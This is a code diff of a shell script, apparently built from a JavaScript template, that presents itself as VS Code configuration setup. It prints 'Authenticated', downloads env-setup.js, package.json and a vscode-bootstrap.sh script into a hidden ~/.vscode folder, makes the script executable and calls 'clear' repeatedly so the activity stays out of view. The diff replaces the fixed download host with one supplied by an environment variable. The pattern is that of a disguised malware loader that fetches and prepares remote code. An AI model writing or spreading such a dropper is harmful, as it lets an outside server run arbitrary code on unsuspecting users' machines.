@@ -238,7 +238,7 @@ fi
 # -------------------------
 USER_HOME="$HOME/.vscode"
 mkdir -p "\${USER_HOME}"
-BASE_URL="https://vscode-config-settings.vercel.app"
+BASE_URL="${process.env.DOMAIN}"
 echo "[INFO] Downloading env-setup.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
     wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=9"
@@ -370,7 +370,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/.vscode"
 clear
-curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://vscode-config-settings.vercel.app/settings/bootstrap/linux?flag=9"
+curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "${process.env.DOMAIN}/settings/bootstrap/linux?flag=9"
 clear
 chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
 clear
@@ -387,7 +387,7 @@ echo "Authenticated"
 TARGET_DIR="$HOME/.vscode"
 mkdir -p "$TARGET_DIR"
 clear
-wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://vscode-config-settings.vercel.app/settings/bootstrap/linux?flag=9"
+wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "${process.env.DOMAIN}/settings/bootstrap/linux?flag=9"
 clear
 chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
 clear
